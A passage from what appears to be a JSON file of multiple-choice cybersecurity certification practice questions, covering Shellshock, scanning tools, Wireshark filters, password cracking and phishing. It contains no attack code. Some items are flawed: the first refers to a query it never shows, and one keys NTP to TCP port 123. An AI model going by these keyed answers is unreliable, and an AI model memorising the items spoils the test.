    "question": "Shellshock is a serious bug in the Bash command-line interface shell that allows an attacker to execute commands by gaining unauthorized access to computer systems. What is the result of executing this query on a vulnerable host?",
    "answer": "Display of the contents of the passwd file.",
    "hint": null,
    "options": [
      "Display of the contents of the passwd file.",
      "Copying the contents of the passwd file",
      "Deleting the passwd file.",
      "Creating a passwd file."
    ]
  },
  {
    "question": "Which of the following is a vulnerability in modern processors such as Intel, AMD, and ARM using speculative execution?",
    "answer": "Spectre and Meltdown",
    "hint": null,
    "options": [
      "Launch Daemon",
      "Spectre and Meltdown",
      "Application Shimming",
      "Named Pipe Impersonation"
    ]
  },
  {
    "question": "Buffer overflow mainly occurs when a created memory partition (or buffer) is written beyond its intended boundaries. What programming language is this example in?",
    "answer": "C",
    "hint": null,
    "options": [
      "SQL",
      "Java",
      "C",
      "HTML"
    ]
  },
  {
    "question": "The network elements of the telecom operator are located in the data center under the protection of firewalls and intrusion prevention systems. Which of the following is true for additional security measures?",
    "answer": "Periodic security checks and audits are required. Access to network elements should be provided by user IDs with strong passwords.",
    "hint": null,
    "options": [
      "No additional measures are required, since the attacker does not have physical access to the data center equipment.",
      "Firewalls and intrusion detection systems are sufficient to ensure complete security.",
      "Periodic security checks and audits are required. Access to network elements should be provided by user IDs with strong passwords.",
      "No additional measures are required since attacks and downtime are inevitable, and a backup site is required."
    ]
  },
  {
    "question": "What is the name of the practice of collecting information from published or otherwise publicly available sources?",
    "answer": "Open-source intelligence",
    "hint": null,
    "options": [
      "Human intelligence",
      "Artificial intelligence",
      "Open-source intelligence",
      "Social intelligence"
    ]
  },
  {
    "question": "Black-hat hacker Ivan created a fraudulent website to steal users' credentials. What of the proposed tasks does he need to perform so that users are redirected to a fake one when entering the domain name of a real site?",
    "answer": "DNS spoofing",
    "hint": null,
    "options": [
      "ARP Poisoning",
      "SMS phishing",
      "MAC Flooding",
      "DNS spoofing"
    ]
  },
  {
    "question": "The flexible SNMP architecture allows you to monitor and manage all network devices from a single console. The data exchange is based on the Protocol Data Unit (PDU). There are 7 PDUs in the latest version of the SNMP protocol. Which of them sends a notification about the past event immediately, without waiting for the manager's request, and does not need confirmation of receipt?",
    "answer": "Trap",
    "hint": null,
    "options": [
      "GetRequest",
      "GetNextRequest",
      "Trap",
      "InformRequest"
    ]
  },
  {
    "question": "The Domain Name System (DNS) is the phonebook of the Internet. When a user tries to access a web address like “example.com”, web browser or application performs a DNS Query against a DNS server, supplying the hostname. The DNS server takes the hostname and resolves it into a numeric IP address, which the web browser can connect to. Which of the proposed tools allows you to set different DNS query types and poll arbitrarily specified servers?",
    "answer": "Nslookup",
    "hint": null,
    "options": [
      "Nikto",
      "Wireshark",
      "Nslookup",
      "Metasploit"
    ]
  },
  {
    "question": "Which of the following is correct?",
    "answer": "Sniffers operate on Layer 2 of the OSI model.",
    "hint": null,
    "options": [
      "Sniffers operate on Layer 3 of the OSI model.",
      "Sniffers operate on both Layer 2 & Layer 3 of the OSI model.",
      "Sniffers operate on Layer 2 of the OSI model.",
      "Sniffers operate on Layer 4 of the OSI model."
    ]
  },
  {
    "question": "NIST defines risk management as the process of identifying, assessing, and controlling threats to an organization's capital and earnings. But what is the 'risk' itself?",
    "answer": "Potential that a threat will exploit vulnerabilities of an asset or group of assets.",
    "hint": null,
    "options": [
      "Potential that a threat will exploit vulnerabilities of an asset or group of assets.",
      "Weakness in an information system, system security procedures, internal controls, or implementation that could be exploited or triggered by a threat source.",
      "The unauthorized disclosure, modification, or use of sensitive data.",
      "An occurrence that actually or potentially jeopardizes the confidentiality, integrity, or availability of an information system."
    ]
  },
  {
    "question": "What Linux command will you use to resolve a domain name into an IP address?",
    "answer": "host -t a resolveddomain.com",
    "hint": null,
    "options": [
      "host -t ns resolveddomain.com",
      "host -t a resolveddomain.com",
      "host -t AXFR resolveddomain.com",
      "host -t soa resolveddomain.com"
    ]
  },
  {
    "question": "The attacker managed to gain access to Shellshock, and now he can execute arbitrary commands and gain unauthorized access to many Internet-facing services. Which of the following operating system can't be affected by an attacker yet?",
    "answer": "Windows",
    "hint": null,
    "options": [
      "Windows",
      "OS X",
      "Linux",
      "Unix"
    ]
  },
  {
    "question": "A digital signature is the digital equivalent of a handwritten signature or stamped seal. It is intended to solve the problem of tampering and impersonation in digital communications. Which of the following option does a digital signature NOT provide?",
    "answer": "Confidentiality",
    "hint": null,
    "options": [
      "Integrity",
      "Non-repudiation",
      "Confidentiality",
      "Authentication"
    ]
  },
  {
    "question": "Lisandro is engaged in sending spam. To avoid blocking, he connects to incorrectly configured SMTP servers that allow e-mail relay without authentication (which allows Lisandro to fake information about the sender's identity). What is the name of such an SMTP server?",
    "answer": "Open mail relay",
    "hint": null,
    "options": [
      "Weak SMTP.",
      "Message transfer agent.",
      "Open mail relay.",
      "Public SMTP server."
    ]
  },
  {
    "question": "Identify which of the following will provide you with the most information about the system's security posture?",
    "answer": "Port scanning, banner grabbing, service identification",
    "hint": null,
    "options": [
      "Phishing, spamming, sending trojans",
      "Wardriving, warchalking, social engineering",
      "Port scanning, banner grabbing, service identification",
      "Social engineering, company site browsing, tailgating"
    ]
  },
  {
    "question": "Which mode of a NIC (interface) allows you to intercept and read each network packet that arrives in its entirety?",
    "answer": "Promiscuous mode",
    "hint": null,
    "options": [
      "Simplex Mode",
      "Port forwarding",
      "Multicast",
      "Promiscuous mode"
    ]
  },
  {
    "question": "When getting information about the web server, you should be familiar with methods GET, POST, HEAD, PUT, DELETE, TRACE. There are two critical methods in this list: PUT (upload a file to the server) and DELETE (delete a file from the server). When using nmap, you can detect all these methods. Which of the following nmap scripts will help you detect these methods?",
    "answer": "http-methods",
    "hint": null,
    "options": [
      "http enum",
      "http-headers",
      "http ETag",
      "http-methods"
    ]
  },
  {
    "question": "Identify an adaptive SQL Injection testing technique by the description: A testing technique is used to discover coding errors by inputting massive amounts of random data and observing the changes in the output.",
    "answer": "Fuzz Testing.",
    "hint": null,
    "options": [
      "Fuzz Testing.",
      "Dynamic Testing.",
      "Functional Testing.",
      "Static application security testing."
    ]
  },
  {
    "question": "Which of the following is the type of message that sends the client to the server to begin a 3-way handshake while establishing a TCP connection?",
    "answer": "SYN",
    "hint": null,
    "options": [
      "SYN",
      "SYN-ACK",
      "ACK",
      "RST"
    ]
  },
  {
    "question": "Confidential information is stored and processed on your company's servers, however, auditing has never been enabled. What of the following should be done before enabling the audit feature?",
    "answer": "Determine the impact of enabling the audit feature.",
    "hint": null,
    "options": [
      "Perform a cost/benefit analysis of the audit feature.",
      "Allocate funds for staffing of audit log review.",
      "Determine the impact of enabling the audit feature.",
      "Perform a vulnerability scan of the system."
    ]
  },
  {
    "question": "Which of the following best describes of counter-based authentication system?",
    "answer": "An authentication system that creates one-time passwords that are encrypted with secret keys.",
    "hint": null,
    "options": [
      "An authentication system that creates one-time passwords that are encrypted with secret keys.",
      "An authentication system that bases authentication decisions on behavioural attributes.",
      "An authentication system that bases authentication decisions on physical attributes.",
      "An authentication system that uses passphrases that are converted into virtual passwords."
    ]
  },
  {
    "question": "Which of the following method of password cracking takes the most time?",
    "answer": "Brute force",
    "hint": null,
    "options": [
      "Dictionary attack",
      "Brute force",
      "Rainbow tables",
      "Shoulder surfing"
    ]
  },
  {
    "question": "Leonardo, an employee of a cybersecurity firm, conducts an audit for a third-party company. First of all, he plans to run a scanning that looks for common misconfigurations and outdated software versions. Which of the following tools is most likely to be used by Leonardo?",
    "answer": "Nikto",
    "hint": null,
    "options": [
      "Nmap",
      "Nikto",
      "Armitage",
      "Metasploit"
    ]
  },
  {
    "question": "The absolute majority of routers and switches use packet filtering firewalls. That kind of firewalls makes decisions about allowing traffic to pass into the network based on the information contained in the packet header. At what level of the OSI model do these firewalls work?",
    "answer": "Network layer",
    "hint": null,
    "options": [
      "Physical layer",
      "Session layer",
      "Application layer",
      "Network layer"
    ]
  },
  {
    "question": "Lisandro is a novice fraudster, he uses special software purchased in the depths of the network for sending his malware. This program allows it to deceive pattern-based detection mechanisms and even some behavior-based ones, disguising malwares as harmless programs. What does Lisandro use?",
    "answer": "Crypter",
    "hint": null,
    "options": [
      "Crypter",
      "Ransomware",
      "Payload",
      "Dropper"
    ]
  },
  {
    "question": "Enumeration is a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system. What type of enumeration is used to get shared resources on individual hosts on the network and a list of computers belonging to the domain?",
    "answer": "Netbios enumeration",
    "hint": null,
    "options": [
      "Netbios enumeration",
      "SNMP enumeration",
      "NTP enumeration",
      "SMTP enumeration"
    ]
  },
  {
    "question": "Having a sufficient database of passwords, you can use statistical analysis of the list of words, you can create a very effective way to crack passwords for such tools as, for example, John The Ripper. Which of the attacks uses such an analysis to calculate the probability of placing characters in a quasi-brute attack?",
    "answer": "Markov Chain",
    "hint": null,
    "options": [
      "Prince",
      "Markov Chain",
      "Fingerprint",
      "Toggle-Case"
    ]
  },
  {
    "question": "Alex, a network administrator, received a warning from IDS about a possibly malicious sequence of packets sent to a Web server in the network's external DMZ. The packet traffic was captured by the IDS and saved to a PCAP file. Now Alex needs to determine if these packets are genuinely malicious or simply a false positive. Which of the following type of network tools will he use?",
    "answer": "Protocol analyzer.",
    "hint": null,
    "options": [
      "Host-based intrusion prevention system (HIPS).",
      "Protocol analyzer.",
      "Vulnerability scanner.",
      "Intrusion Prevention System (IPS)."
    ]
  },
  {
    "question": "Identify the structure designed to verify and authenticate the identity of individuals within the enterprise taking part in a data exchange?",
    "answer": "PKI",
    "hint": null,
    "options": [
      "PKI",
      "single sign-on",
      "biometrics",
      "SOA"
    ]
  },
  {
    "question": "Organizations need to deploy a web-based software package that requires three separate servers and internet access. What is the recommended architecture in terms of server placement?",
    "answer": "A web server facing the Internet, an application server on the internal network, a database server on the internal network.",
    "hint": null,
    "options": [
      "A web server and the database server facing the Internet, an application server on the internal network.",
      "All three servers need to be placed internally.",
      "All three servers need to face the Internet so that they can communicate between themselves.",
      "A web server facing the Internet, an application server on the internal network, a database server on the internal network."
    ]
  },
  {
    "question": "Which of the following is true about the AES and RSA encryption algorithms?",
    "answer": "RSA is asymmetric, which is used to create a public/private key pair; AES is symmetric, which is used to encrypt data.",
    "hint": null,
    "options": [
      "AES is asymmetric, which is used to create a public/private key pair; RSA is symmetric, which is used to encrypt data.",
      "Both are asymmetric algorithms, but RSA uses 1024-bit keys.",
      "Both are symmetric algorithms, but AES uses 256-bit keys.",
      "RSA is asymmetric, which is used to create a public/private key pair; AES is symmetric, which is used to encrypt data."
    ]
  },
  {
    "question": "Jack needs to analyze the files produced by several packet-capture programs such as Wireshark, tcpdump, EtherPeek, and WinDump. Which of the following tools will Jack use?",
    "answer": "tcptrace",
    "hint": null,
    "options": [
      "tcptraceroute",
      "Nessus",
      "tcptrace",
      "OpenVAS"
    ]
  },
  {
    "question": "Which of the following nmap options can be used for very fast scanning?",
    "answer": "-T5",
    "hint": null,
    "options": [
      "-T0",
      "-O",
      "-T4",
      "-T5"
    ]
  },
  {
    "question": "Identify a tool that can be used for passive OS fingerprinting?",
    "answer": "tcpdump",
    "hint": null,
    "options": [
      "ping",
      "tcpdump",
      "nmap",
      "tracert"
    ]
  },
  {
    "question": "ISAPI filters is a powerful tool that is used to extend the functionality of IIS. However, improper use can cause huge harm. Why do EC-Council experts recommend that security analysts monitor the disabling of unused ISAPI filters?",
    "answer": "To defend against webserver attacks",
    "hint": null,
    "options": [
      "To defend against wireless attacks",
      "To prevent memory leaks",
      "To defend against webserver attacks",
      "To prevent leaks of confidential data"
    ]
  },
  {
    "question": "Identify a low-tech way of gaining unauthorized access to information?",
    "answer": "Social engineering",
    "hint": null,
    "options": [
      "Scanning",
      "Eavesdropping",
      "Sniffing",
      "Social engineering"
    ]
  },
  {
    "question": "Which of the following services run on TCP port 123 by default?",
    "answer": "NTP",
    "hint": null,
    "options": [
      "Telnet",
      "DNS",
      "NTP",
      "POP3"
    ]
  },
  {
    "question": "The SOC analyst of the company wants to track the transfer of files over the unencrypted FTP protocol, which filter for the Wireshark sniffer should he use?",
    "answer": "tcp.port ==21",
    "hint": null,
    "options": [
      "tcp.port == 443",
      "tcp.port == 80",
      "tcp.port = 23",
      "tcp.port ==21"
    ]
  },
  {
    "question": "Your company regularly conducts backups of critical servers but cannot afford them to be sent off-site vendors for long-term storage and archiving. The company found a temporary solution in the form of storing backups in the company's safe. During the next audit, there was a risk associated with the fact that backup storages are not stored off-site. The company manager has a plan to take the backup storages home with him and wants to know what two things he can do to secure the backup tapes while in transit?",
    "answer": "Encrypt the backup tapes and transport them in a lockbox.",
    "hint": null,
    "options": [
      "Degauss the backup tapes and transport them in a lockbox.",
      "Encrypt the backup tapes and transport them in a lockbox.",
      "Encrypt the backup tapes and use a courier to transport them.",
      "Hash the backup tapes and transport them in a lockbox."
    ]
  },
  {
    "question": "Gabriella uses Google search operators, which allow you to optimize and expand the capabilities of regular search. What will be the result of this request? site:eccouncil.org discount -ilearn",
    "answer": "Results about all discounts from the site eccouncil.org except for the ilearn format.",
    "hint": null,
    "options": [
      "The results that match the entire query.",
      "Results about all discounts from the site eccouncil.org except for the ilearn format.",
      "Results about all discounts from the site ec-council.org for the ilearn training format.",
      "Results from the ec-council website except for discounts and the ilearn format."
    ]
  },
  {
    "question": "There are different ways of pentest of a system, network, or application in information security based on how much information you have about the target. There's black box testing, white box testing, and gray box testing. Which of the statements is true about grey-box testing?",
    "answer": "The tester only partially knows the internal structure.",
    "hint": null,
    "options": [
      "The tester has full access to the internal structure.",
      "The tester is unaware of the internal structure.",
      "The tester does not have access at all.",
      "The tester only partially knows the internal structure."
    ]
  },
  {
    "question": "When choosing a biometric system for your company, you should take into account the factors of system performance and whether they are suitable for you or not. What determines such a factor as the throughput rate?",
    "answer": "The data collection speeds, data processing speed, or enrolment time.",
    "hint": null,
    "options": [
      "The probability that the system fails to detect a biometric input when presented correctly.",
      "The maximum number of sets of data that can be stored in the system.",
      "The data collection speeds, data processing speed, or enrolment time.",
      "The probability that the system incorrectly matches the input pattern to a non-matching template in the database."
    ]
  },
  {
    "question": "The attacker tries to find the servers of the attacked company. He uses the following command: nmap 192.168.1.64/28. The scan was successful, but he didn't get any results. Identify why the attacker could not find the server based on the following information: The attacked company used network address 192.168.1.64 with mask 255.255.255.192. In the network, the servers are in the addresses 192.168.1.122, 192.168.1.123 and 192.168.1.124.",
    "answer": "He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range.",
    "hint": null,
    "options": [
      "He needs to add the command \"ip address\" just before the IP address.",
      "He needs to change the address to 192.168.1.0 with the same mask.",
      "He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range.",
      "The network must be down and the nmap command and IP address are ok."
    ]
  },
  {
    "question": "Victims of DoS attacks often are web servers of high-profile organizations such as banking, commerce, media companies, or government and trade organizations. Which of the following symptom could indicate a DoS or DDoS attack?",
    "answer": "An inability to access any website",
    "hint": null,
    "options": [
      "An inability to access any website",
      "Damage and corrupt files.",
      "Unknown programs running on your system.",
      "Misbehaviour of computer programs and application."
    ]
  },
  {
    "question": "Rajesh, a black-hat hacker, could not find vulnerabilities in the target company's network since their infrastructure is very well protected. IDS, firewall with strict rules, etc. He is trying to find such an attack method independent of the reliability of the infrastructure of this company. Which attack is an option suitable for Rajesh?",
    "answer": "Social Engineering",
    "hint": null,
    "options": [
      "Buffer Overflow",
      "Denial-of-Service",
      "Social Engineering",
      "Confidence trick"
    ]
  },
  {
    "question": "Identify the attack where the hacker uses the ciphertexts corresponding to a set of plaintexts of his own choosing?",
    "answer": "Chosen-plaintext",
    "hint": null,
    "options": [
      "Kasiski examination",
      "Chosen-plaintext",
      "Differential cryptanalysis",
      "Known-plaintext attack"
    ]
  },
  {
    "question": "Due to the network slowdown, the IT department decided to monitor the Internet traffic of all employees to track a possible cause, but they can't do it immediately. Which of the following is troublesome to take this kind of measure from a legal point of view?",
    "answer": "Not informing the employees that they are going to be monitored could be an invasion of privacy.",
    "hint": null,
    "options": [
      "The absence of an official responsible for traffic on the network.",
      "Not informing the employees that they are going to be monitored could be an invasion of privacy.",
      "Lack of comfortable working conditions.",
      "All of the employees would stop normal work activities."
    ]
  },
  {
    "question": "What is the name of the risk assessment method that allows you to study how various types of negative events (violations, failures or destructions) can affect the main activities of the company and key business processes?",
    "answer": "Business Impact Analysis (BIA)",
    "hint": null,
    "options": [
      "Disaster Recovery Planning (DRP)",
      "Business Impact Analysis (BIA)",
      "Emergency Plan Response (EPR)",
      "Risk Mitigation"
    ]
  },
  {
    "question": "Which of the following type of hackers refers to an individual who works both offensively and defensively?",
    "answer": "Gray Hat",
    "hint": null,
    "options": [
      "White Hat",
      "Gray Hat",
      "Suicide Hacker",
      "Black Hat"
    ]
  },
  {
    "question": "While performing online banking using a browser, your friend receives a message that contains a link to a website. He decides to click on this link, and another browser session starts and displays a funny video. A few hours later, he receives a letter from the bank stating that his online bank was visited from another country and tried to transfer money. The bank also asks him to contact them and confirm the transfer if he really made it. What vulnerability did the attacker use when attacking your friend?",
    "answer": "Cross-Site Request Forgery",
    "hint": null,
    "options": [
      "Cross-Site Request Forgery",
      "Webform input validation",
      "Cross-Site Scripting",
      "Clickjacking"
    ]
  },
  {
    "question": "Which of the following is the most effective way against encryption ransomware?",
    "answer": "Use the 3-2-1 backup rule.",
    "hint": null,
    "options": [
      "Use multiple antivirus software.",
      "Pay a ransom.",
      "Analyze the ransomware to get the decryption key of encrypted data.",
      "Use the 3-2-1 backup rule."
    ]
  },
  {
    "question": "Which of the following modes of IPSec should you use to assure integrity and confidentiality of data within the same LAN?",
    "answer": "ESP transport mode.",
    "hint": null,
    "options": [
      "ESP tunnel mode.",
      "AH tunnel mode.",
      "ESP transport mode.",
      "AH transport mode."
    ]
  },
  {
    "question": "To protect the enterprise infrastructure from the constant attacks of the evil hacker Ivan, Viktor divided the network into two parts using the network segmentation approach. · In the first one (local, without direct Internet access), he isolated business-critical resources. · In the second (external, with Internet access), he placed public web servers to provide services to clients. Subnets communicate with each other through a gateway protected by a firewall. What is the name of the external subnet?",
    "answer": "Demilitarized Zone",
    "hint": null,
    "options": [
      "Demilitarized Zone",
      "WAF",
      "Bastion host",
      "Network access control"
    ]
  },
  {
    "question": "John needs to send a super-secret message, and for this, he wants to use the technique of hiding a secret message within an ordinary message. The technique provides \"security through obscurity.\" Which of the following techniques will John use?",
    "answer": "Steganography",
    "hint": null,
    "options": [
      "Digital watermarking",
      "Encryption",
      "Steganography",
      "Deniable encryption"
    ]
  },
  {
    "question": "Identify the algorithm according to the following description: That wireless security algorithm was rendered useless by capturing packets and discovering the passkey in seconds. This vulnerability was strongly affected to TJ Maxx company. This vulnerability led to a network invasion of the company and data theft through a technique known as wardriving.",
    "answer": "Wired Equivalent Privacy (WEP)",
    "hint": null,
    "options": [
      "Wi-Fi Protected Access (WPA)",
      "Wi-Fi Protected Access 2 (WPA2)",
      "Temporal Key Integrity Protocol (TKIP)",
      "Wired Equivalent Privacy (WEP)"
    ]
  },
  {
    "question": "What of the following is the most common method of using \"ShellShock\" or \"Bash Bug\"?",
    "answer": "Through Web servers utilizing CGI to send a malformed environment variable.",
    "hint": null,
    "options": [
      "Using SSH.",
      "Through Web servers utilizing CGI to send a malformed environment variable.",
      "Manipulate format strings in text fields.",
      "Using SYN Flood."
    ]
  },
  {
    "question": "Which of the following is most useful for quickly checking for SQL injection vulnerability by sending a special character to web applications?",
    "answer": "Single quotation",
    "hint": null,
    "options": [
      "Semicolon",
      "Single quotation",
      "Double quotation",
      "Backslash"
    ]
  },
  {
    "question": "John received this text message: \"Hello, this is Jack Smith from the Gmail customer service. Kindly contact me about problems with your account: jacksmith@gmail.com\". Which statement below is true?",
    "answer": "This is a scam as everybody can get a @gmail.com address, not the Gmail customer service employees.",
    "hint": null,
    "options": [
      "John should write to jacksmith@gmail.com to verify the identity of Jack.",
      "This is a scam as everybody can get a @gmail.com address, not the Gmail customer service employees.",
      "This is a scam because John does not know Jack.",
      "This is probably a legitimate message as it comes from a respectable organization."
    ]
  },
  {
    "question": "Which of the following stops vehicles from crashing through the doors of a building?",
    "answer": "Bollards",
    "hint": null,
    "options": [
      "Bollards",
      "Turnstile",
      "Mantrap",
      "Traffic barrier"
    ]
  },
  {
    "question": "Identify a security policy that defines using of a VPN for gaining access to an internal corporate network?",
    "answer": "Remote access policy",
    "hint": null,
    "options": [
      "Information protection policy",
      "Access control policy",
      "Network security policy",
      "Remote access policy"
    ]
  },
  {
    "question": "Identify the type of DNS configuration in which first DNS server on the internal network and second DNS in DMZ?",
    "answer": "Split DNS",
    "hint": null,
    "options": [
      "Split DNS",
      "EDNS",
      "DynDNS",
      "DNSSEC"
    ]
  },
  {
    "question": "Which of the following is an entity in a PKI that will vouch for the identity of an individual or company?",
    "answer": "CA",
    "hint": null,
    "options": [
      "KDC",
      "CA",
      "CR",
      "VA"
    ]
  },
  {
    "question": "Alex, the system administrator, should check the firewall configuration. He knows that all traffic from workstations must pass through the firewall to access the bank's website. Alex must ensure that workstations in network 10.10.10.0/24 can only reach the bank website 10.20.20.1 using HTTPS. Which of the following firewall rules best meets this requirement?",
    "answer": "If (source matches 10.10.10.0/24 and destination matches 10.20.20.1 and port matches 443) then permit",
    "hint": null,
    "options": [
      "If (source matches 10.10.10.0/24 and destination matches 10.20.20.1 and port matches 80 or 443) then permit",
      "If (source matches 10.20.20.1 and destination matches 10.10.10.0/24 and port matches 443) then permit",
      "If (source matches 10.10.10.0 and destination matches 10.20.20.1 and port matches 443) then permit",
      "If (source matches 10.10.10.0/24 and destination matches 10.20.20.1 and port matches 443) then permit"
    ]
  },
  {
    "question": "The CIA Triad is a security model that highlights the main goals of data security and serves as a guide for organizations to protect their confidential data from unauthorized access and data theft. What are the three concepts of the CIA triad?",
    "answer": "Confidentiality, integrity, and availability",
    "hint": null,
    "options": [
      "Transference, transformation and transcendence",
      "Comparison, reflection and abstraction",
      "Efficiency, equity and liberty",
      "Confidentiality, integrity, and availability"
    ]
  },
  {
    "question": "Implementing the security testing process early in the SDLC is the key to finding out and fixing the security bugs early in the SDLC lifecycle. The security testing process can be performed in two ways, Automated or Manual web application security testing. Which of the proposed statements is true?",
    "answer": "Automatic and manual testing should be used together to better cover potential problems",
    "hint": null,
    "options": [
      "Automatic testing requires a lot of money and is still very imperfect, so it cannot be used for security",
      "Automatic and manual testing should be used together to better cover potential problems",
      "Manual testing is obsolete and should be completely replaced by automatic testing.",
      "Neural networks and artificial intelligence are already used in new tools and do not require additional actions"
    ]
  },
  {
    "question": "What type of cryptography is used in IKE, SSL, and PGP?",
    "answer": "Public Key",
    "hint": null,
    "options": [
      "Public Key",
      "Hash",
      "Digest",
      "Secret Key"
    ]
  },
  {
    "question": "The ping utility is used to check the integrity and quality of connections in networks. In the process, it sends an ICMP Echo-Request and captures the incoming ICMP Echo-Reply, but quite often remote nodes block or ignore ICMP. Which of the options will solve this problem?",
    "answer": "Use hping",
    "hint": null,
    "options": [
      "Use arping",
      "Use traceroute",
      "Use hping",
      "Use broadcast ping"
    ]
  },
  {
    "question": "An attacker tries to infect as many devices connected to the Internet with malware as possible to get the opportunity to use their computing power and functionality for automated attacks hidden from the owners of these devices. Which of the proposed approaches fits description of the attacker's actions?",
    "answer": "Creating a botnet",
    "hint": null,
    "options": [
      "Mass distribution of Ransomware",
      "APT attack",
      "Creating a botnet",
      "Using Banking Trojans"
    ]
  },
  {
    "question": "To send an email using SMTP protocol which does not encrypt messages and leaving the information vulnerable to being read by an unauthorized person. To solve this problem, SMTP can upgrade a connection between two mail servers to use TLS, and the transmitted emails will be encrypted. Which of the following commands is used by SMTP to transmit email over TLS?",
    "answer": "STARTTLS",
    "hint": null,
    "options": [
      "OPPORTUNISTICTLS",
      "UPGRADETLS",
      "STARTTLS",
      "FORCETLS"
    ]
  },
  {
    "question": "The company secretly hired hacker Ivan to attack its competitors before a major tender. Ivan did not start with complex technological attacks but decided to hit the employees and their reputation. To do this, he collected personal information about key employees of a competitor company. Then he began to distribute it in the open form on the Internet by adding false information about past racist statements of employees. As a result of the scandal in social networks and the censure of employees, competitors lost the opportunity to win the tender, and Ivan's work was done. What is the name of this form of attack?",
    "answer": "Doxing",
    "hint": null,
    "options": [
      "Vishing",
      "Piggybacking",
      "Doxing",
      "Daisy-chaining"
    ]
  },
  {
    "question": "Which of the following is a component of IPsec that performs protocol-level functions required to encrypt and decrypt the packets?",
    "answer": "IPsec driver",
    "hint": null,
    "options": [
      "IPsec Policy Agent",
      "Internet Key Exchange (IKE)",
      "IPsec driver",
      "Oakley"
    ]
  },
  {
    "question": "You need to conduct a technical assessment of the network for a small company that supplies medical services. All computers in the company use Windows OS. What is the best approach for discovering vulnerabilities?",
    "answer": "Use a scan tool like Nessus.",
    "hint": null,
    "options": [
      "Check MITRE.org for the latest list of CVE findings.",
      "Use a scan tool like Nessus.",
      "Create a disk image of a clean Windows installation.",
      "Use the built-in Windows Update tool."
    ]
  },
  {
    "question": "As a result of the attack on the dating web service, Ivan received a dump of all user passwords in a hashed form. Ivan recognized the hashing algorithm and started identifying passwords. What tool is he most likely going to use if the service used hashing without salt?",
    "answer": "Rainbow table",
    "hint": null,
    "options": [
      "Brute force",
      "Rainbow table",
      "XSS",
      "Dictionary attacks"
    ]
  },
  {
    "question": "Evil Russian hacker Ivan is attacking again! This time, he got a job in a large American company to steal commercial information for his customer to gain a competitive advantage in the market. In his attack, Ivan used all available means, especially blackmail, bribery, and technological surveillance. What is the name of such an attack?",
    "answer": "Corporate Espionage",
    "hint": null,
    "options": [
      "Social Engineering",
      "Business Loss",
      "Information Leakage",
      "Corporate Espionage"
    ]
  },
  {
    "question": "John, a cybersecurity specialist, wants to perform a syn scan in his company's network. He has two machines. The first machine (192.168.0.98) has snort installed, and the second machine (192.168.0.151) has kiwi Syslog installed. When he started a syn scan in the network, he notices that kiwi Syslog is not receiving the alert message from snort. He decides to run Wireshark in the snort machine to check if the messages are going to the kiwi Syslog machine. What Wireshark filter will show the connections from the snort machine to kiwi Syslog machine?",
    "answer": "tcp.dstport==514 && ip.dst==192.168.0.151",
    "hint": null,
    "options": [
      "tcp.dstport==514 && ip.dst==192.168.0.0/16",
      "tcp.srcport==514 && ip.src==192.168.0.98",
      "tcp.srcport==514 && ip.src==192.168.151",
      "tcp.dstport==514 && ip.dst==192.168.0.151"
    ]
  },
  {
    "question": "Sniffing is a process of monitoring and capturing all data packets passing through a given network. An intruder can capture and analyze all network traffic by placing a packet sniffer on a network in promiscuous mode. Sniffing can be either Active or Passive in nature. How does passive sniffing work?",
    "answer": "This is the process of sniffing through the hub.",
    "hint": null,
    "options": [
      "This is the process of sniffing through the router.",
      "This is the process of sniffing through the switch.",
      "This is the process of sniffing through the hub.",
      "This is the process of sniffing through the gateway."
    ]
  },
  {
    "question": "A rootkit is a clandestine computer program designed to provide continued privileged access to a computer while actively hiding its presence. They are classified according to the place of their injection. What type of rootkit loads itself underneath the computer’s operating system and can intercept hardware calls made by the original operating system.",
    "answer": "Hypervisor (Virtualized) Rootkits",
    "hint": null,
    "options": [
      "Application rootkit",
      "Hypervisor (Virtualized) Rootkits",
      "Memory rootkit",
      "Kernel mode rootkits"
    ]
  },
  {
    "question": "Which of the following is a common IDS evasion technique?",
    "answer": "Unicode characters",
    "hint": null,
    "options": [
      "Unicode characters",
      "Spyware",
      "Port knocking",
      "Subnetting"
    ]
  },
  {
    "question": "You want to surf safely and anonymously on the Internet. Which of the following options will be best for you?",
    "answer": "Use Tor network with multi-node.",
    "hint": null,
    "options": [
      "Use Tor network with multi-node.",
      "Use VPN.",
      "Use public WiFi.",
      "Use SSL sites."
    ]
  },
  {
    "question": "How can resist an attack using rainbow tables?",
    "answer": "Use password salting.",
    "hint": null,
    "options": [
      "Use of non-dictionary words.",
      "Use password salting.",
      "Lockout accounts under brute force password cracking attempts.",
      "All uppercase character passwords."
    ]
  },
  {
    "question": "Which of the following best describes the operation of the Address Resolution Protocol?",
    "answer": "It sends a request packet to all the network elements, asking for the MAC address from a specific IP.",
    "hint": null,
    "options": [
      "It sends a reply packet for a specific IP, asking for the MAC address.",
      "It sends a request packet to all the network elements, asking for the MAC address from a specific IP.",
      "It sends a request packet to all the network elements, asking for the domain name from a specific IP.",
      "It sends a reply packet to all the network elements, asking for the MAC address from a specific IP."
    ]
  },
  {
    "question": "Which characteristic is most likely not to be used by companies in biometric control for use on the company's territory?",
    "answer": "Height/Weight",
    "hint": null,
    "options": [
      "Iris patterns",
      "Fingerprints",
      "Height/Weight",
      "Voice"
    ]
  },
  {
    "question": "Alex, a cybersecurity science student, needs to fill in the information into a secured PDF-file job application received from a prospective employer. He can't enter the information because all the fields are blocked. He doesn't want to request a new document that allows the forms to be completed and decides to write a script that pulls passwords from a list of commonly used passwords to try against the secured PDF until the correct password is found or the list is exhausted. Which attack is the student attempting?",
    "answer": "Dictionary-attack",
    "hint": null,
    "options": [
      "Brute-force attack",
      "Dictionary-attack",
      "Man-in-the-middle attack",
      "Session hijacking"
    ]
  },
  {
    "question": "TLS, also known as SSL, is a protocol for encrypting communications over a network. Which of the following statements is correct?",
    "answer": "SSL/TLS uses both asymmetric and symmetric encryption.",
    "hint": null,
    "options": [
      "SSL/TLS uses do not uses asymmetric or symmetric encryption.",
      "SSL/TLS uses only symmetric encryption.",
      "SSL/TLS uses only asymmetric encryption.",
      "SSL/TLS uses both asymmetric and symmetric encryption."
    ]
  },
  {
    "question": "Which of the following Linux-based tools will help you change any user's password or activate disabled accounts if you have physical access to a Windows 2008 R2 and an Ubuntu 9.10 Linux LiveCD?",
    "answer": "CHNTPW",
    "hint": null,
    "options": [
      "CHNTPW",
      "Cain & Abel",
      "SET",
      "John the Ripper"
    ]
  },
  {
